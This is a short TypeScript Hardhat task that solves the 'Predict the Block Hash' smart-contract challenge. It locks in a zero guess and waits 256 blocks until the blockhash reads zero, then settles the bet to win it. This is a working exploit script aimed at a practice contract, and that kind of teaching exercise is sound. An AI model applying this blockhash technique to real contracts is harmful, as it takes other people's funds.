import { utils } from "ethers";
import { task } from "hardhat/config";

const contractAddress = "0x4c99d5477B32F44fDE4dd1Fe9e9B498a87CFAbF1";

task("predict-the-block-hash", "Solves the 'Predict the Block Hash' challenge", async (_taskArgs, hre) => {
  const challengeFactory = await hre.ethers.getContractFactory("PredictTheBlockHashChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  console.log("locking the number...");
  const lockInGuessTx = await challengeContract.lockInGuess(
    "0x0000000000000000000000000000000000000000000000000000000000000000",
    { value: utils.parseEther("1"), gasLimit: 1000000 },
  );
  await lockInGuessTx.wait();

  const initBlockNumber = await hre.ethers.provider.getBlockNumber();

  // Wait for 256 blocks
  let lastBlockNumber = initBlockNumber;
  do {
    try {
      lastBlockNumber = await hre.ethers.provider.getBlockNumber();
      console.log(`Block number: ${lastBlockNumber}`);
      await new Promise(resolve => setTimeout(resolve, 1000 * 12));
    } catch (err) {
      console.log(err);
    }
  } while (lastBlockNumber - initBlockNumber < 256);

  const attackTx = await challengeContract.settle();
  await attackTx.wait();
});
